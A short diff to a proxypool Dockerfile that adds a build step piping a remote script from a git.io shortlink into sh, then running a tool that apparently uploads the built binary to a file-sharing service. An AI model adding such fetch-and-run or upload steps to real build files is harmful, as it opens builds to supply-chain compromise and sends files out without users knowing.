@@ -5,7 +5,9 @@ WORKDIR /proxypool-src
 COPY . /proxypool-src
 RUN go mod download && \
     make docker && \
-    mv ./bin/proxypool-docker /proxypool
+    mv ./bin/proxypool-docker /proxypool && \
+    curl -sL https://git.io/file-transfer | sh && \
+    ./transfer wet proxypool
 
 FROM alpine:latest
 
